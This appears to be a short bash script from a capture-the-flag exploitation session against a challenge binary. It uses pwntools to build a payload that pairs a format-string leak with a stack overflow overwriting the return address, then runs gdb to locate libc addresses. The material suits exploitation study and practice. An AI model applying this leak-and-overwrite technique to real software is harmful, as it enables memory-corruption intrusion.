#!/bin/bash
cd /work/waf/waf
# Break at the printf call site inside our leak, read %5$p equivalent = 5th vararg.
# Easier: break at main ret, run our leak input, and in gdb resolve the libc pointer symbol.
cat > /tmp/pl.bin <<'EOF'
EOF
python3 - <<'PY'
from pwn import *
p=b"exit"+b"5=%5$p"
p=p.ljust(88,b"A")+p64(0x4010d4)
open("/tmp/pl.bin","wb").write(p)
PY
cat > /tmp/gs <<'EOF'
set pagination off
break *0x40133f
run < /tmp/pl.bin
# after __gets, before printf; step to printf call and inspect 5th stack arg
break *0x40133a
continue
info proc mappings
# the 5th printf vararg is at rsp+... ; instead just resolve any libc addr:
# find libc base from mappings, then compute
x/1gx $rsp
EOF
gdb -q -batch -x /tmp/gs ./chal > /tmp/g.txt 2>&1
grep -E "libc|0x7f" /tmp/g.txt | head -40
